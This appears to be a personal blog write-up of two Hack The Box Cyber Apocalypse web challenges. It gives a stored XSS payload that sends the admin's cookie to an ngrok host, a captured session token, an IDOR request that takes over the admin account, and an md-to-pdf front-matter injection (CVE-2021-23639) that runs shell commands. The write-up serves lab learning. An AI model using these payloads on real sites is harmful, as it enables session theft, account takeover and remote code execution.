---
title: HTB Cyber Apocalypse Web Writeup
date: 2022-05-18 12:00:00 -0400
image: 
 src: https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf0.jpg
 height: 3000
 width: 450
categories: [HTB Writeups, Cyber Apocalypse CTF]
tags: [web security, ctf, owasp]
---

# Kryptos Support

Checking the web page of this challenge gives a form to send an issue and an admin will review that issue.
![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf1.jpg)

So its interesting, maybe the admin will click in that issue and we can inject some kind of payload, like an stored xss, these approach is similar to the bankrobber box in htb.

So we can craft the payload to steal the cookie of the admin or the user who will review out ticket.

```bash
<script> var i=new Image(); i.src='https://yourip.sa.ngrok.io?cookie='+escape(document.cookie);</script>
```

After set up our ngrok proxy and netcat listening in one port, with this payload we can steal the reviewer account cookie.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf2.jpg)

We receive the response and the cookie 
``` bash
session=DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTMwMjI3OTZ9.KpxQxzNncJfI12UlhXA3t7Li8TOB18dNr0FmMCb0ksA
```

So we can create a cookie with the name session and copy the value.

From the files we can see that one directory is tickets, so i try to enter and we can see we are moderator

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf3.jpg)

We see a function to reset a password, maybe we can try an IDOR for User Account Takeover changing the password of admin. Intercepting the request to the reset password function, we can change the uid from 100 to 1, and resend with our password.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf5.jpg)

```json
{"password":"jesus","uid":"1"}
```

And finally we can login as admin with our password and see our flag

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf4.jpg)

`HTB{x55_4nd_id0rs_ar3_fun!!}`

# Blinker Fluids
Checking the web page of this challenge i can see an invoice list, i can edit, delete and export an invoice in pdf format, an interesting thing is that we submit the invoice in markdown and its converted to pdf, so lets check the source code.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf6.jpg)

We see the add function calls mdhelper to convert the markdown file to pdf, so checking mdhelper.js file we see this:

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf8.jpg)

We see that is using the `md-to-pdf` node module so with some research on google i found this [Synk Vuln DB: CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) 

Code of the POC:

``` javascript
const { mdToPdf } = require('md-to-pdf');

var payload = '---jsn((require("child_process")).execSync("id > /tmp/RCE.txt"))n---RCE';

```

Then i change the payload to copy the flag, which is in the root directory to the invoice of default in the directory static/invoices, so the payload was:

``` javascript
---javascript
((require("child_process")).execSync("cp /flag.txt /app/static/invoices/f0daa85f-b9de-4b78-beff-2f86e242d6ac.pdf")
---RCE
```
Then when i open the invoice it gives me an error, but in dev tools i can see the base64 string which is the flag.

![](https://raw.githubusercontent.com/s4yhii/s4yhii.github.io/master/assets/images/htb/ctf/ctf9.jpg)

`HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}`


Thanks for read, Happy Hacking!




